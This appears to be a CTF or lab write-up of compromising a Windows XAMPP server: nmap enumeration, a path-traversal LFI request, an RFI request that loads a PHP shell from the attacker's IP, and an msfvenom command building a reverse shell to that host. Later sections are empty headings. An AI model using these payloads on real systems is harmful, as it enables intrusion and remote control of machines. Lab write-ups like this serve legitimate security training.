#Pwned! 
```IP
192.168.164.53
```
## Enumeration
## Nmap
As always I start enumerating target ports with nmap:
```Bash
sudo nmap -sCV 192.168.164.53 -vvv -p- -oN enum/full
```
The output being:
```
PORT      STATE SERVICE       REASON          VERSION                                                                
21/tcp    open  ftp           syn-ack ttl 125 FileZilla ftpd 0.9.41 beta  
| ftp-syst:                                                                                                          
|_  SYST: UNIX emulated by FileZilla                                                                                 
135/tcp   open  msrpc         syn-ack ttl 125 Microsoft Windows RPC       
139/tcp   open  netbios-ssn   syn-ack ttl 125 Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds? syn-ack ttl 125                                                                        
3306/tcp  open  mysql?        syn-ack ttl 125           
| mysql-info: 
|_  MySQL Error: Host '192.168.45.189' is not allowed to connect to this MariaDB server
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, LDAPSearchReq, LPDString, NCP, NULL, TerminalServer, X11Probe, giop: 
|_    Host '192.168.45.189' is not allowed to connect to this MariaDB server
4443/tcp  open  http          syn-ack ttl 125 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-methods:                                       
|_  Supported Methods: GET HEAD POST OPTIONS          
| http-title: Welcome to XAMPP               
|_Requested resource was http://192.168.164.53:4443/dashboard/
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
5040/tcp  open  unknown       syn-ack ttl 125
7680/tcp  open  pando-pub?    syn-ack ttl 125
8080/tcp  open  http          syn-ack ttl 125 Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-open-proxy: Proxy might be redirecting requests                                                               
| http-title: Welcome to XAMPP                                                                                       
|_Requested resource was http://192.168.164.53:8080/dashboard/
|_http-favicon: Unknown favicon MD5: 6EB4A43CB64C97F76562AF703893C8FD
49664/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49667/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 125 Microsoft Windows RPC
```
## FTP 21
FileZilla ftpd 0.9.41 beta
https://github.com/NeoTheCapt/FilezillaExploit/tree/master
## SMB
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210105939.png?raw=true)

## HTTP 8080
XAMPP
phpmyadmin Access to the requested directory is only available from the local network.
phpinfo.php
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210105723.png?raw=true)
user rupert
big.txt
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210110447.png?raw=true)
/site
LFI in page parameter
```
http://192.168.164.53:4443/site/index.php?page=..\..\..\..\Windows\System32\drivers\etc\hosts
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210110647.png?raw=true)


## MYSQL 3306
Host '192.168.45.189' is not allowed to connect to this MariaDB server
## HTTP 4443
Apache httpd 2.4.43

# Exploitation
I tried RFI
```
http://192.168.164.53:4443/site/index.php?page=http://192.168.45.189/shell-ivan.php
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210184137.png?raw=true)
# PrivEsc

## Manual

```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.189 LPORT=4444 -f exe > reverse.exe
```
![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210191250.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210191226.png?raw=true)

![](https://github.com/bipbopbup/writeups/blob/main/Media/Pasted%20image%2020241210191359.png?raw=true)
## Automated

### Peass
### Mimikatz

# Lateral Movement

